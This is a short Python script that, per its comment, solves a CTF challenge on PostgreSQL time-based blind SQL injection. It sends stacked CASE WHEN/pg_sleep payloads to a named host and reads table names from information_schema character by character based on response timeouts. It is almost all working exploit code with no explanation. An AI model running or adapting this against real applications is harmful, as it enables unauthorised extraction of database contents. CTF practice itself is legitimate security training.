#!/usr/bin/env python
import socket
import requests
#之前做的一道CTF题，考察的是postgresql的时间盲注。

table = ''
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36'}

for t in range(8,20):
	for y in range(1, 20):
		for i in range(65,126):
			try:
				url = 'http://m37gvj32.guetsec.com:9999/index.php?id=1;SELECT CASE WHEN (COALESCE(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET '+str(t)+'),'+str(y)+',1)),0) = '+str(i)+') THEN pg_sleep(5) ELSE pg_sleep(0) END LIMIT 1'
				req = requests.get(url, headers=headers, timeout=5)
			except:
				table += chr(i)
				print str(i)+':yes'
	print 'table is:'+table+' '


